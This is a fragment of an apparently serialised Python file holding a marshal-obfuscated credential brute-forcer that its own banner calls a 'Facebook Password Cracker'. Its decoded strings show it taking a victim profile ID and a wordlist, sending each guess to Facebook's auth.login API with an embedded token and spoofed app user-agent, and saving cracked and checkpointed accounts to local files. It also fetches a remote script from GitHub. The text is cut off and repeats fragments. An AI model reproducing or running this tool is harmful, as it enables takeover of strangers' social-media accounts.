ready...i\\x03\\x00\\x00\\x00sJ\\x00\\x00\\x00https:\/\/raw.githubusercontent.com\/Noob-Hacker71\/Noob-Hacker71\/main\/info.pys\\x07\\x00\\x00\\x00\\x1b[1;30ms\\x07\\x00\\x00\\x00\\x1b[1;31ms\\x07\\x00\\x00\\x00\\x1b[1;32ms\\x07\\x00\\x00\\x00\\x1b[1;33ms\\x07\\x00\\x00\\x00\\x1b[1;34ms\\x07\\x00\\x00\\x00\\x1b[1;35ms\\x07\\x00\\x00\\x00\\x1b[1;36ms\\x07\\x00\\x00\\x00\\x1b[1;37ms\\x07\\x00\\x00\\x00\\x1b[1;94ms\\x07\\x00\\x00\\x00\\x1b[0;00ms\\xed\\x00\\x00\\x00\\n{ycl}[+] Attacking In Background For Fast Cracking ...\\n{bcl}[+] This A Facebook Password Cracker Script ...\\n{gcl}[+] Attack With Your Custom Wordlist ...\\n{rcl}[+] This Script From Noob-Hacker71 ...\\n{ccl}[+] Use It At Your Own Risk ...\\n\\nt\\x03\\x00\\x00\\x00bclt\\x03\\x00\\x00\\x00rclt\\x03\\x00\\x00\\x00gclt\\x03\\x00\\x00\\x00cclt\\x03\\x00\\x00\\x00ycls\\xd7\\x00\\x00\\x00{rcl}[+] {ycl}Connect A Fast Network For Better Experience..\\n{rcl}[+] {rcl}Don\\'t Use It For Any Illigele Puspose...\\n{rcl}[+] {gcl}For Stop Attack Press CTRL + \\\\ ...\\n--------------------------------------------------t\\x02\\x00\\x00\\x00Ons#\\x00\\x00\\x00You Need Noob-Hacker71\\'s Permissioni\\x02\\x00\\x00\\x00s\/\\x00\\x00\\x00xdg-open https:\/\/www.facebook.com\/ntahsan.nayems\\x1b\\x00\\x00\\x00figlet -f small Brute-Forces\\x13\\x00\\x00\\x00Enter Username =>> s\\x0e\\x00\\x00\\x00\\nCorrect User\\ns\\x13\\x00\\x00\\x00Enter Password =>> s\\x17\\x00\\x00\\x00\\nSuccessfully Logged Ins\\x0f\\x00\\x00\\x00\\nWrong Passwords\\x18\\x00\\x00\\x00\\nWrong User,,,Try Again\\ns\\x1c\\x00\\x00\\x00\\nEnter Victim Profile ID >> s\\x11\\x00\\x00\\x00Wordlist Path >> s\\x0e\\x00\\x00\\x00\\nWordlist =>> t\\x01\\x00\\x00\\x00rs\\x14\\x00\\x00\\x00\\nTotal Password =>> c\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x05\\x00\\x00\\x00C\\x00\\x00\\x00s\\xa7\\x00\\x00\\x00y\\x11\\x00t\\x00\\x00j\\x01\\x00d\\x01\\x00\\x83\\x01\\x00\\x01Wn\\x11\\x00\\x04t\\x02\\x00k\\n\\x00r$\\x00\\x01\\x01\\x01n\\x01\\x00Xy7\\x00x0\\x00t\\x03\\x00t\\x04\\x00d\\x02\\x00\\x83\\x02\\x00j\\x05\\x00\\x83\\x00\\x00D]\\x19\\x00}\\x00\\x00t\\x06\\x00j\\x07\\x00|\\x00\\x00j\\x08\\x00\\x83\\x00\\x00\\x83\\x01\\x00\\x01q>\\x00WWn\\x11\\x00\\x01\\x01\\x01t\\t\\x00d\\x03\\x00\\x83\\x01\\x00\\x01n\\x01\\x00Xd\\x04\\x00\\x84\\x00\\x00}\\x01\\x00y \\x00t\\n\\x00d\\x05\\x00\\x83\\x01\\x00}\\x02\\x00|\\x02\\x00j\\x0b\\x00|\\x01\\x00t\\x06\\x00\\x83\\x02\\x00\\x01Wn\\x07\\x00\\x01\\x01\\x01n\\x01\\x00Xd\\x00\\x00S(\\x06\\x00\\x00\\x00Nt\\x04\\x00\\x00\\x00saveR\\x14\\x00\\x00\\x00t\\x04\\x00\\x00\\x00Exitc\\x01\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x03\\x00\\x00\\x00S\\x00\\x00\\x00s\\xfe\\x00\\x00\\x00|\\x00\\x00}\\x01\\x00t\\x00\\x00j\\x01\\x00d\\x01\\x00t\\x02\\x00\\x17d\\x02\\x00\\x17|\\x01\\x00\\x17d\\x03\\x00\\x17\\x83\\x01\\x00}\\x02\\x00t\\x03\\x00j\\x04\\x00|\\x02\\x00\\x83\\x01\\x00}\\x03\\x00d\\x04\\x00|\\x03\\x00k\\x06\\x00r\\x93\\x00t\\x05\\x00t\\x06\\x00d\\x05\\x00\\x17t\\x02\\x00\\x17d\\x06\\x00\\x17|\\x01\\x00\\x17d\\x07\\x00\\x17\\x83\\x01\\x00\\x01t\\x01\\x00d\\x08\\x00d\\t\\x00\\x83\\x02\\x00}\\x04\\x00|\\x04\\x00j\\x07\\x00t\\x02\\x00d\\n\\x00\\x17|\\x01\\x00\\x17d\\x07\\x00\\x17\\x83\\x01\\x00\\x01|\\x04\\x00j\\x08\\x00\\x83\\x00\\x00\\x01ng\\x00d\\x0b\\x00|\\x03\\x00d\\x0c\\x00\\x19k\\x06\\x00r\\xfa\\x00t\\x05\\x00t\\t\\x00d\\r\\x00\\x17t\\x02\\x00\\x17d\\x06\\x00\\x17t\\t\\x00\\x17|\\x01\\x00\\x17d\\x07\\x00\\x17\\x83\\x01\\x00\\x01t\\x01\\x00d\\x0e\\x00d\\t\\x00\\x83\\x02\\x00}\\x05\\x00|\\x05\\x00j\\x07\\x00t\\x02\\x00d\\n\\x00\\x17|\\x01\\x00\\x17d\\x07\\x00\\x17\\x83\\x01\\x00\\x01|\\x05\\x00j\\x08\\x00\\x83\\x00\\x00\\x01n\\x00\\x00d\\x00\\x00S(\\x0f\\x00\\x00\\x00Ns\\x91\\x00\\x00\\x00https:\/\/b-api.facebook.com\/method\/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s\\x17\\x00\\x00\\x00&locale=en_US&password=sH\\x00\\x00\\x00&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmt\\x0c\\x00\\x00\\x00access_tokens\\x0b\\x00\\x00\\x00\\n[NOOB_OK] s\\x05\\x00\\x00\\x00  |  s\\x01\\x00\\x00\\x00\\ns\\x18\\x00\\x00\\x00save\/Noob_Successful.txtt\\x01\\x00\\x00\\x00as\\n\\x00\\x00\\x00 [ NOOB ] s\\x10\\x00\\x00\\x00www.facebook.comt\\t\\x00\\x00\\x00error_msgs\\x0b\\x00\\x00\\x00\\n[NOOB_CP] s\\x18\\x00\\x00\\x00save\/Noob_CheckPoint.txt(\\n\\x00\\x00\\x00t\\x02\\x00\\x00\\x00brt\\x04\\x00\\x00\\x00opent\\x06\\x00\\x00\\x00victimt\\x04\\x00\\x00\\x00jsont\\x04\\x00\\x00\\x00loadR\\x0b\\x00\\x00\\x00R\\x11\\x00\\x00\\x00R\\x04\\x00\\x00\\x00t\\x05\\x00\\x00\\x00closeR\\x12\\x00\\x00\\x00(\\x06\\x00\\x00\\x00R\\x08\\x00\\x00\\x00t\\x04\\x00\\x00\\x00linet\\x04\\x00\\x00\\x00datat\\x01\\x00\\x00\\x00qt\\x03\\x00\\x00\\x00okbt\\x03\\x00\\x00\\x00cps(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00R\\n\\x00\\x00\\x00t\\x04\\x00\\x00\\x00main\\x89\\x00\\x00\\x00s\\x1a\\x00\\x00\\x00\\x00\\x01\\x06\\x02\\x1f\\x01\\x0f\\x02\\x0c\\x01\\x1e\\x01\\x0f\\x01\\x19\\x01\\r\\x02\\x10\\x01\"\\x01\\x0f\\x01\\x19\\x01i\\x1e\\x00\\x00\\x00(\\x0c\\x00\\x00\\x00t\\x02\\x00\\x00\\x00ost\\x05\\x00\\x00\\x00mkdirt\\x07\\x00\\x00\\x00OSErrorR\\x1b\\x00\\x00\\x00t\\x03\\x00\\x00\\x00filt\\t\\x00\\x00\\x00readlinest\\x02\\x00\\x00\\x00idt\\x06\\x00\\x00\\x00appendt\\x05\\x00\\x00\\x00stript\\x04\\x00\\x00\\x00exitR\\x00\\x00\\x00\\x00t\\x03\\x00\\x00\\x00map(\\x03\\x00\\x00\\x00R\\t\\x00\\x00\\x00R%\\x00\\x00\\x00t\\x01\\x00\\x00\\x00p(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00R\\n\\x00\\x00\\x00t\\x04\\x00\\x00\\x00Noob~\\x00\\x00\\x00s\\x1e\\x00\\x00\\x00\\x00\\x01\\x03\\x01\\x11\\x01\\r\\x01\\x04\\x01\\x03\\x01\\x1c\\x01\\x1b\\x01\\x03\\x01\\x0e\\x02\\t\\x13\\x03\\x01\\x0c\\x01\\x14\\x01\\x03\\x01(\\x02\\x00\\x00\\x00s\\n\\x00\\x00\\x00user-agents\\x1e\\x01\\x00\\x00Dalvik\/1.6.0 (Linux; U; Android 4.4.2; NX55 Build\/KOT5506) [FBAN\/FB4A;FBAV\/106.0.0.26.68;FBBV\/45904160;FBDM\/{density=3.0,width=1080,height=1920};FBLC\/it_IT;FBRV\/45904160;FBCR\/PosteMobile;FBMF\/asus;FBBD\/asus;FBPN\/com.facebook.katana;FBDV\/ASUS_Z00AD;FBSV\/5.0;FBOP\/1;FBCA\/x86:armeabi-v7a;](<\\x00\\x00\\x00R&\\x00\\x00\\x00R\\x02\\x00\\x00\\x00R\\x06\\x00\\x00\\x00t\\x06\\x00\\x00\\x00randomR\\x1d\\x00\\x00\\x00t\\x08\\x00\\x00\\x00requestst\\x0b\\x00\\x00\\x00ImportErrort\\x06\\x00\\x00\\x00systemt\\t\\x00\\x00\\x00mechanizet\\x14\\x00\\x00\\x00multiprocessing.poolR\\x00\\x00\\x00\\x00R\\x01\\x00\\x00\\x00R\\x0b\\x00\\x00\\x00R\\x1a\\x00\\x00\\x00t\\x11\\x00\\x00\\x00set_handle_robotst\\x05\\x00\\x00\\x00Falset\\x12\\x00\\x00\\x00set_handle_refresht\\x05\\x00\\x00\\x00_httpt\\x14\\x00\\x00\\x00HTTPRefreshProcessort\\n\\x00\\x00\\x00addheadersR\\x07\\x00\\x00\\x00t\\x07\\x00\\x00\\x00sessiont\\x02\\x00\\x00\\x00rst\\x03\\x00\\x00\\x00gett\\x02\\x00\\x00\\x00rgt\\x04\\x00\\x00\\x00textt\\x01\\x00\\x00\\x00xR+\\x00\\x00\\x00t\\x03\\x00\\x00\\x00aclR\\x0f\\x00\\x00\\x00R\\x10\\x00\\x00\\x00R\\x12\\x00\\x00\\x00R\\x0e\\x00\\x00\\x00t\\x03\\x00\\x00\\x00pclR\\x11\\x00\\x00\\x00t\\x03\\x00\\x00\\x00wclt\\x03\\x00\\x00\\x00mclt\\x03\\x00\\x00\\x00nclt\\x06\\x00\\x00\\x00formatt\\x04\\x00\\x00\\x00warnt\\x04\\x00\\x00\\x00infot\\n\\x00\\x00\\x00PermissionR.\\x00\\x00\\x00t\\x04\\x00\\x00\\x00Truet\\t\\x00\\x00\\x00raw_inputt\\x03\\x00\\x00\\x00Usrt\\x04\\x00\\x00\\x00Usert\\x03\\x00\\x00\\x00psdt\\x03\\x00\\x00\\x00Pwdt\\x04\\x00\\x00\\x00logoR\\x1c\\x00\\x00\\x00t\\x08\\x00\\x00\\x00passlistR)\\x00\\x00\\x00t\\x03\\x00\\x00\\x00strR\\x1b\\x00\\x00\\x00R*\\x00\\x00\\x00t\\x04\\x00\\x00\\x00wordt\\x04\\x00\\x00\\x00filet\\x03\\x00\\x00\\x00lenR1\\x00\\x00\\x00(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00R\\n\\x00\\x00\\x00t\\x08\\x00\\x00\\x00<module>\\x05\\x00\\x00\\x00s\\xa0\\x00\\x00\\x00<\\x02\\x03\\x01\\x10\\x01\\r\\x01\\x11\\x01\\r\\x02\\x03\\x01\\x10\\x01\\r\\x01\\r\\x01\\x10\\x02\\x10\\x01\\x10\\x02\\t\\x07\\x0c\\x01\\r\\x01\\x1c\\x01\\x0c\\x03\\r\\x02\\n\\x01\\r\\x01\\r\\x01\\x0c\\x01\\t\\x01\\x0f\\x01\\x08\\x06\\x06\\x04\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x07*\\x04$\\x02\\x0c\\x01\\x03\\x02\\x0e\\x01\\r\\x01\\r\\x01\\x07\\x02\\t\\x01\\r\\x01\\n\\x01\\x10\\x01\\x0c\\x01\\x0e\\x01\\x10\\x01\\x0c\\x01\\x0e\\x01\\x04\\x02\\x0e\\x01\\x10\\x02\\x0e\\x01\\x11\\x02\\r\\x01\\x05\\x01\\n\\x01\\x10\\x01\\x10\\x01\\x06\\x01\\x18\\x01\\x15\\x02\\x12\\x01\\x12\\x01\\x1e\\x06\\t%(\\x02\\x00\\x00\\x00t\\x07\\x00\\x00\\x00marshalt\\x05\\x00\\x00\\x00loads(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00t\\x00\\x00\\x00\\x00t\\x08\\x00\\x00\\x00<module>\\x01\\x00\\x00\\x00s\\x02\\x00\\x00\\x00\\x0c\\x02(\\x02\\x00\\x00\\x00t\\x07\\x00\\x00\\x00marshalt\\x05\\x00\\x00\\x00loads(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00t\\x00\\x00\\x00\\x00t\\x08\\x00\\x00\\x00<module>\\x01\\x00\\x00\\x00s\\x02\\x00\\x00\\x00\\x0c\\x02'))"]}],"source":"\nimport marshal exec(marshal.loads('c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00@\\x00\\x00\\x00s!\\x00\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x00\\x00Z\\x00\\x00e\\x00\\x00j\\x01\\x00d\\x02\\x00\\x83\\x01\\x00d\\x01\\x00\\x04Ud\\x01\\x00S(\\x03\\x00\\x00\\x00i\\xff\\xff\\xff\\xffNs\\x0e\\x15\\x00\\x00c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00@\\x00\\x00\\x00s!\\x00\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x00\\x00Z\\x00\\x00e\\x00\\x00j\\x01\\x00d\\x02\\x00\\x83\\x01\\x00d\\x01\\x00\\x04Ud\\x01\\x00S(\\x03\\x00\\x00\\x00i\\xff\\xff\\xff\\xffNs\\x80\\x14\\x00\\x00c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0b\\x00\\x00\\x00@\\x00\\x00\\x00s\\xfc\\x03\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x00\\x00Z\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x01\\x00Z\\x01\\x00d\\x00\\x00d\\x01\\x00l\\x02\\x00Z\\x02\\x00d\\x00\\x00d\\x01\\x00l\\x03\\x00Z\\x03\\x00d\\x00\\x00d\\x01\\x00l\\x04\\x00Z\\x04\\x00y\\x10\\x00d\\x00\\x00d\\x01\\x00l\\x05\\x00Z\\x05\\x00Wn\\x1e\\x00\\x04e\\x06\\x00k\\n\\x00rl\\x00\\x01\\x01\\x01e\\x00\\x00j\\x07\\x00d\\x02\\x00\\x83\\x01\\x00\\x01n\\x01\\x00Xe\\x00\\x00j\\x07\\x00d\\x03\\x00\\x83\\x01\\x00\\x01y\\x10\\x00d\\x00\\x00d\\x01\\x00l\\x08\\x00Z\\x08\\x00Wn*\\x00\\x04e\\x06\\x00k\\n\\x00r\\xb6\\x00\\x01\\x01\\x01e\\x00\\x00j\\x07\\x00d\\x04\\x00\\x83\\x01\\x00\\x01d\\x00\\x00d\\x01\\x00l\\x08\\x00Z\\x08\\x00n\\x01\\x00Xd\\x00\\x00d\\x05\\x00l\\t\\x00m\\n\\x00Z\\n\\x00\\x01d\\x00\\x00d\\x06\\x00l\\x08\\x00m\\x0b\\x00Z\\x0b\\x00\\x01d\\x07\\x00\\x84\\x00\\x00Z\\x0c\\x00e\\x08\\x00j\\x0b\\x00\\x83\\x00\\x00Z\\r\\x00e\\r\\x00j\\x0e\\x00e\\x0f\\x00\\x83\\x01\\x00\\x01e\\r\\x00j\\x10\\x00e\\x08\\x00j\\x11\\x00j\\x12\\x00\\x83\\x00\\x00d\\x08\\x00d\\t\\x00\\x83\\x01\\x01\\x01d2\\x00g\\x01\\x00e\\r\\x00_\\x13\\x00e\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01e\\x0c\\x00d\\r\\x00\\x83\\x01\\x00\\x01e\\x02\\x00j\\x14\\x00d\\x0e\\x00\\x83\\x01\\x00\\x01e\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01e\\x05\\x00j\\x15\\x00\\x83\\x00\\x00Z\\x16\\x00e\\x16\\x00j\\x17\\x00Z\\x18\\x00e\\x18\\x00d\\x0f\\x00\\x83\\x01\\x00j\\x19\\x00Z\\x1a\\x00e\\x1a\\x00d\\x01\\x00\\x04Ug\\x00\\x00Z\\x1b\\x00d\\x10\\x00Z\\x1c\\x00d\\x11\\x00Z\\x1d\\x00d\\x12\\x00Z\\x1e\\x00d\\x13\\x00Z\\x1f\\x00d\\x14\\x00Z \\x00d\\x15\\x00Z!\\x00d\\x16\\x00Z\"\\x00d\\x17\\x00Z ","sourceWithComments":"import marshal\n#https:\/\/youtube.com\/NjankSoekamti\nexec(marshal.loads('c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00@\\x00\\x00\\x00s!\\x00\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x00\\x00Z\\x00\\x00e\\x00\\x00j\\x01\\x00d\\x02\\x00\\x83\\x01\\x00d\\x01\\x00\\x04Ud\\x01\\x00S(\\x03\\x00\\x00\\x00i\\xff\\xff\\xff\\xffNs\\x0e\\x15\\x00\\x00c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00@\\x00\\x00\\x00s!\\x00\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x00\\x00Z\\x00\\x00e\\x00\\x00j\\x01\\x00d\\x02\\x00\\x83\\x01\\x00d\\x01\\x00\\x04Ud\\x01\\x00S(\\x03\\x00\\x00\\x00i\\xff\\xff\\xff\\xffNs\\x80\\x14\\x00\\x00c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0b\\x00\\x00\\x00@\\x00\\x00\\x00s\\xfc\\x03\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x00\\x00Z\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x01\\x00Z\\x01\\x00d\\x00\\x00d\\x01\\x00l\\x02\\x00Z\\x02\\x00d\\x00\\x00d\\x01\\x00l\\x03\\x00Z\\x03\\x00d\\x00\\x00d\\x01\\x00l\\x04\\x00Z\\x04\\x00y\\x10\\x00d\\x00\\x00d\\x01\\x00l\\x05\\x00Z\\x05\\x00Wn\\x1e\\x00\\x04e\\x06\\x00k\\n\\x00rl\\x00\\x01\\x01\\x01e\\x00\\x00j\\x07\\x00d\\x02\\x00\\x83\\x01\\x00\\x01n\\x01\\x00Xe\\x00\\x00j\\x07\\x00d\\x03\\x00\\x83\\x01\\x00\\x01y\\x10\\x00d\\x00\\x00d\\x01\\x00l\\x08\\x00Z\\x08\\x00Wn*\\x00\\x04e\\x06\\x00k\\n\\x00r\\xb6\\x00\\x01\\x01\\x01e\\x00\\x00j\\x07\\x00d\\x04\\x00\\x83\\x01\\x00\\x01d\\x00\\x00d\\x01\\x00l\\x08\\x00Z\\x08\\x00n\\x01\\x00Xd\\x00\\x00d\\x05\\x00l\\t\\x00m\\n\\x00Z\\n\\x00\\x01d\\x00\\x00d\\x06\\x00l\\x08\\x00m\\x0b\\x00Z\\x0b\\x00\\x01d\\x07\\x00\\x84\\x00\\x00Z\\x0c\\x00e\\x08\\x00j\\x0b\\x00\\x83\\x00\\x00Z\\r\\x00e\\r\\x00j\\x0e\\x00e\\x0f\\x00\\x83\\x01\\x00\\x01e\\r\\x00j\\x10\\x00e\\x08\\x00j\\x11\\x00j\\x12\\x00\\x83\\x00\\x00d\\x08\\x00d\\t\\x00\\x83\\x01\\x01\\x01d2\\x00g\\x01\\x00e\\r\\x00_\\x13\\x00e\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01e\\x0c\\x00d\\r\\x00\\x83\\x01\\x00\\x01e\\x02\\x00j\\x14\\x00d\\x0e\\x00\\x83\\x01\\x00\\x01e\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01e\\x05\\x00j\\x15\\x00\\x83\\x00\\x00Z\\x16\\x00e\\x16\\x00j\\x17\\x00Z\\x18\\x00e\\x18\\x00d\\x0f\\x00\\x83\\x01\\x00j\\x19\\x00Z\\x1a\\x00e\\x1a\\x00d\\x01\\x00\\x04Ug\\x00\\x00Z\\x1b\\x00d\\x10\\x00Z\\x1c\\x00d\\x11\\x00Z\\x1d\\x00d\\x12\\x00Z\\x1e\\x00d\\x13\\x00Z\\x1f\\x00d\\x14\\x00Z \\x00d\\x15\\x00Z!\\x00d\\x16\\x00Z\"\\x00d\\x17\\x00Z#\\x00d\\x18\\x00Z$\\x00d\\x19\\x00Z%\\x00d\\x11\\x00Z\\x1d\\x00d\\x12\\x00Z\\x1e\\x00d\\x13\\x00Z\\x1f\\x00d\\x14\\x00Z \\x00d\\x15\\x00Z!\\x00d\\x16\\x00Z\"\\x00d\\x17\\x00Z#\\x00d\\x18\\x00Z$\\x00d\\x19\\x00Z%\\x00d\\x1a\\x00j&\\x00d\\x1b\\x00e \\x00d\\x1c\\x00e\\x1d\\x00d\\x1d\\x00e\\x1e\\x00d\\x1e\\x00e\"\\x00d\\x1f\\x00e\\x1f\\x00\\x83\\x00\\x05Z\\'\\x00d \\x00j&\\x00d\\x1c\\x00e\\x1d\\x00d\\x1f\\x00e\\x1f\\x00d\\x1d\\x00e\\x1e\\x00d\\x1e\\x00e\"\\x00\\x83\\x00\\x04Z(\\x00e)\\x00d!\\x00k\\x02\\x00rS\\x02n\/\\x00e\\x0c\\x00e\"\\x00d\"\\x00\\x17\\x83\\x01\\x00\\x01e\\x02\\x00j\\x14\\x00d#\\x00\\x83\\x01\\x00\\x01e\\x00\\x00j\\x07\\x00d$\\x00\\x83\\x01\\x00\\x01e*\\x00\\x83\\x00\\x00\\x01x\\xb2\\x00e+\\x00r6\\x03e\\x00\\x00j\\x07\\x00d%\\x00\\x83\\x01\\x00\\x01e\\x0c\\x00e\\'\\x00\\x83\\x01\\x00\\x01e,\\x00e \\x00d&\\x00\\x17\\x83\\x01\\x00Z-\\x00e-\\x00e.\\x00k\\x02\\x00r\\x18\\x03e\\x0c\\x00e\\x1e\\x00d\\'\\x00\\x17\\x83\\x01\\x00\\x01e,\\x00e\\x1f\\x00d(\\x00\\x17\\x83\\x01\\x00Z\/\\x00e\/\\x00e0\\x00k\\x02\\x00r\\xfa\\x02e\\x0c\\x00e\\x1e\\x00d)\\x00\\x17\\x83\\x01\\x00\\x01Pq3\\x03e\\x0c\\x00e\\x1d\\x00d*\\x00\\x17\\x83\\x01\\x00\\x01e\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01q\\x85\\x02e\\x0c\\x00e\\x1d\\x00d+\\x00\\x17\\x83\\x01\\x00\\x01e\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01q\\x85\\x02We\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01e1\\x00GHe\\x0c\\x00e(\\x00\\x83\\x01\\x00\\x01e,\\x00e\"\\x00d,\\x00\\x17\\x83\\x01\\x00Z2\\x00e,\\x00e \\x00d-\\x00\\x17\\x83\\x01\\x00Z3\\x00e3\\x00Z4\\x00e\\x0c\\x00e\\x1e\\x00d.\\x00\\x17e5\\x00e4\\x00\\x83\\x01\\x00\\x17\\x83\\x01\\x00\\x01e6\\x00e3\\x00d\/\\x00\\x83\\x02\\x00j7\\x00\\x83\\x00\\x00Z8\\x00e6\\x00e4\\x00d\/\\x00\\x83\\x02\\x00\\x8f1\\x00Z9\\x00e:\\x00e9\\x00j7\\x00\\x83\\x00\\x00\\x83\\x01\\x00Z\\x1a\\x00e\\x0c\\x00e\\x1d\\x00d0\\x00\\x17e5\\x00e\\x1a\\x00\\x83\\x01\\x00\\x17\\x83\\x01\\x00\\x01Wd\\x01\\x00QXd1\\x00\\x84\\x00\\x00Z;\\x00e;\\x00\\x83\\x00\\x00\\x01d\\x01\\x00S(3\\x00\\x00\\x00i\\xff\\xff\\xff\\xffNs\\x15\\x00\\x00\\x00pip2 install requestss\\x15\\x00\\x00\\x00pkg install figlet -ys\\x16\\x00\\x00\\x00pip2 install mechanize(\\x01\\x00\\x00\\x00t\\n\\x00\\x00\\x00ThreadPool(\\x01\\x00\\x00\\x00t\\x07\\x00\\x00\\x00Browserc\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x03\\x00\\x00\\x00C\\x00\\x00\\x00s?\\x00\\x00\\x00x8\\x00|\\x00\\x00D]0\\x00}\\x01\\x00t\\x00\\x00j\\x01\\x00j\\x02\\x00|\\x01\\x00\\x83\\x01\\x00\\x01t\\x00\\x00j\\x01\\x00j\\x03\\x00\\x83\\x00\\x00\\x01t\\x04\\x00j\\x05\\x00d\\x01\\x00\\x83\\x01\\x00\\x01q\\x07\\x00Wd\\x00\\x00S(\\x02\\x00\\x00\\x00Ng\\x9a\\x99\\x99\\x99\\x99\\x99\\xa9?(\\x06\\x00\\x00\\x00t\\x03\\x00\\x00\\x00syst\\x06\\x00\\x00\\x00stdoutt\\x05\\x00\\x00\\x00writet\\x05\\x00\\x00\\x00flusht\\x04\\x00\\x00\\x00timet\\x05\\x00\\x00\\x00sleep(\\x02\\x00\\x00\\x00t\\x03\\x00\\x00\\x00argt\\x01\\x00\\x00\\x00i(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00t\\x00\\x00\\x00\\x00t\\x06\\x00\\x00\\x00motion\\x16\\x00\\x00\\x00s\\x08\\x00\\x00\\x00\\x00\\x01\\r\\x01\\x10\\x01\\r\\x01t\\x08\\x00\\x00\\x00max_timei\\x01\\x00\\x00\\x00s\\n\\x00\\x00\\x00user-agents\\x1e\\x01\\x00\\x00Dalvik\/1.6.0 (Linux; U; Android 4.4.2; NX55 Build\/KOT5506) [FBAN\/FB4A;FBAV\/106.0.0.26.68;FBBV\/45904160;FBDM\/{density=3.0,width=1080,height=1920};FBLC\/it_IT;FBRV\/45904160;FBCR\/PosteMobile;FBMF\/asus;FBBD\/asus;FBPN\/com.facebook.katana;FBDV\/ASUS_Z00AD;FBSV\/5.0;FBOP\/1;FBCA\/x86:armeabi-v7a;]t\\x05\\x00\\x00\\x00clears&\\x00\\x00\\x00\\x1b[1;33m\\nEverything is getting ready...i\\x03\\x00\\x00\\x00sJ\\x00\\x00\\x00https:\/\/raw.githubusercontent.com\/Noob-Hacker71\/Noob-Hacker71\/main\/info.pys\\x07\\x00\\x00\\x00\\x1b[1;30ms\\x07\\x00\\x00\\x00\\x1b[1;31ms\\x07\\x00\\x00\\x00\\x1b[1;32ms\\x07\\x00\\x00\\x00\\x1b[1;33ms\\x07\\x00\\x00\\x00\\x1b[1;34ms\\x07\\x00\\x00\\x00\\x1b[1;35ms\\x07\\x00\\x00\\x00\\x1b[1;36ms\\x07\\x00\\x00\\x00\\x1b[1;37ms\\x07\\x00\\x00\\x00\\x1b[1;94ms\\x07\\x00\\x00\\x00\\x1b[0;00ms\\xed\\x00\\x00\\x00\\n{ycl}[+] Attacking In Background For Fast Cracking ...\\n{bcl}[+] This A Facebook Password Cracker Script ...\\n{gcl}[+] Attack With Your Custom Wordlist ...\\n{rcl}[+] This Script From Noob-Hacker71 ...\\n{ccl}[+] Use It At Your Own Risk ...\\n\\nt\\x03\\x00\\x00\\x00bclt\\x03\\x00\\x00\\x00rclt\\x03\\x00\\x00\\x00gclt\\x03\\x00\\x00\\x00cclt\\x03\\x00\\x00\\x00ycls\\xd7\\x00\\x00\\x00{rcl}[+] {ycl}Connect A Fast Network For Better Experience..\\n{rcl}[+] {rcl}Don\\'t Use It For Any Illigele Puspose...\\n{rcl}[+] {gcl}For Stop Attack Press CTRL + \\\\ ...\\n--------------------------------------------------t\\x02\\x00\\x00\\x00Ons#\\x00\\x00\\x00You Need Noob-Hacker71\\'s Permissioni\\x02\\x00\\x00\\x00s\/\\x00\\x00\\x00xdg-open https:\/\/www.facebook.com\/ntahsan.nayems\\x1b\\x00\\x00\\x00figlet -f small Brute-Forces\\x13\\x00\\x00\\x00Enter Username =>> s\\x0e\\x00\\x00\\x00\\nCorrect User\\ns\\x13\\x00\\x00\\x00Enter Password =>> s\\x17\\x00\\x00\\x00\\nSuccessfully Logged Ins\\x0f\\x00\\x00\\x00\\nWrong Passwords\\x18\\x00\\x00\\x00\\nWrong User,,,Try Again\\ns\\x1c\\x00\\x00\\x00\\nEnter Victim Profile ID >> s\\x11\\x00\\x00\\x00Wordlist Path >> s\\x0e\\x00\\x00\\x00\\nWordlist =>> t\\x01\\x00\\x00\\x00rs\\x14\\x00\\x00\\x00\\nTotal Password =>> 